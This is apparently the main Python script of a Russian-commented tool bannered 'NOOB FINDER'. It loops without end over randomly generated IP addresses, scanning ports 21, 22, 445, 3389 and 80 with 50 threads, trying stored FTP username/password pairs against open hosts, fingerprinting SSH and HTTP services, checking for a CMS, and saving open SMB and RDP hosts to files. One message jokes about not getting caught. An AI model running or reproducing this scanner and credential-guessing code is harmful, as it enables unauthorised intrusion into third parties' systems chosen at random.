#модуль для получения ответов с сервера
import requests
#модуль случайного выбора
import random
import time
import concurrent.futures
#модуль для разбора содержимого страницы
from bs4 import BeautifulSoup
from rich.console import Console
from rich.progress import Progress


from passes import ftp_credentials
from scan import check_port, gen_ip, check_cms
from fingprint import httpfing, sshfing, ftpfing
from ftp_check import try_connect_ftp

console = Console()


console.print("""[bold green] __   _  _____   _____  ______       _______ _____ __   _ ______  _______  ______
 | \  | |     | |     | |_____]      |______   |   | \  | |     \ |______ |_____/
 |  \_| |_____| |_____| |_____]      |       __|__ |  \_| |_____/ |______ |    \_
                                                                                 """)
console.print("[bold blue]Ищем случайные хосты ...", end="")

def process_ip(ip):
    ports = [21, 22, 445, 3389, 80]
    for port in ports:
        is_open = check_port(ip, port)
        status = "Открыт" if is_open else "Закрыт"
        if status == "Открыт":
            console.print(f"\r Порт {port}: {status} for {ip}  ", end="")
            
            if status == "Открыт" and port == 21:
                ftpfing(ip)
                for username, password in ftp_credentials:
                    try:
                        try_connect_ftp(ip, username, password)
                    except Exception:
                        console.print("[bold red]БЕЗ ПАЛЕВА ага ЗАНОВО.")
                        break  # Прерываем цикл при возникновении ошибки
            
            if status == "Открыт" and port == 22:
                sshfing(ip)
            
            if status == "Открыт" and port == 445:
                with open('445.txt', 'a') as smb:
                    smb.write(f'{ip}:445\n')
            if status == "Открыт" and port == 3389:
                with open('3389.txt', 'a') as rdp:
                    rdp.write(f'{ip}:3389\n')
            if status == "Открыт" and port == 80:
                httpfing(ip)
                check_cms(ip)
            console.print(".", end="")
        time.sleep(0.1)

while True:
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            ips_to_check = [gen_ip() for _ in range(50)]  # генерируем 100 IP для проверки
            executor.map(process_ip, ips_to_check)
    except Exception as e:
        print(f"Error")
